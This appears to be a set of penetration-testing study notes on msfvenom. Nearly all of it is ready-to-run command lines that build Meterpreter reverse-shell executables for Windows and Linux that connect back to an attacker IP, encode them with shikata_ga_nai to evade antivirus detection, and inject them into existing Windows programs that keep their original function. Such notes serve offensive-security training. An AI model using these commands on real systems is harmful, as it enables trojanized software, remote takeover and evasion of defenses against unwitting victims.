- Command line utility to generate and encode MSF payloads for various operating systems as well as web servers.
- Msfvenom is a combination of two utilities, namely; msfpayload and msfencode.
- We can use Msfvenom to generate a malicious meterpreter payload that can be transferred to a client target system. Once executed, it will connect back to our payload handler and provide us with remote access to the target system.

List all the payloads that can be generated:

```sh
msfvenom --list-payloads
```

## Payload Naming Conventions

`<OS>/<ARCH>/<payload>`
- Example: `linux/x86/shell_reverse_tcp`

Exception: Windows 32bit targets. Arch is not specified.
- Example: `windows/shell_reverse_tcp`

*Staged* payloads are denoted with a forward slash (`/`).
*Stateless* payloads with an underscore (`_`).

This rules also apply to Meterpreter payloads.
Example: `windows/x64/meterpreter/reverse_tcp`.

## Payload Generation

Windows 32 bit meterpreter payload via reverse TCP connection:

```sh
msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=<attacker-ip> LPORT=<local-port> -f exe > path/to/payload_outputx86.exe
```

64 bits:

```sh
msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=<attacker-ip> LPORT=<local-port> -f exe > path/to/payload_outputx64.exe
```

Generate a linux 32 bit meterpreter payload via reverse TCP:

```shell
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=!0.10.10.5 LPORT=1234 -f elf > path/to/payload_outputx86
```

> If no architecture is selected (`-a`), msfvenom will decide the most suitable one.

## Payload Encoding
If the payload is not encoded, then it will always be the same → same hash always → easy to detect by AV.

List encoders:

```sh
msfvenom --list encoders
```

Encode a windows 32 bit meterpreter payload via reverse TCP using shikata_ga_nai technique. Use 10 iterations for the encoder.

```sh
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -i 10 -e x86/shikata_ga_nai -f exe > path/to/encoded_payloadx86.exe
```

> More than 10 iterations usually won’t improve the encoding.

For linux 32 bit meterpreter payload via reverse TCP:

```sh
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -i 10 -e x86/shikata_ga_nai -f elf > path/to/encoded_payloadx86
```

## Inject Payloads Into Windows Portable Executables
We use `-x` flag for injecting the payload into an existing Windows Portable Executable:

```shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -e x86/shikata_ga_nai -i 10 -f exe -x path/to/windows_portable_executable > path_to_output_file.exe
```

> But after injecting payload, the original functionality of the executable will not longer be working. We can maintain its original functionality by using the `-k flag`.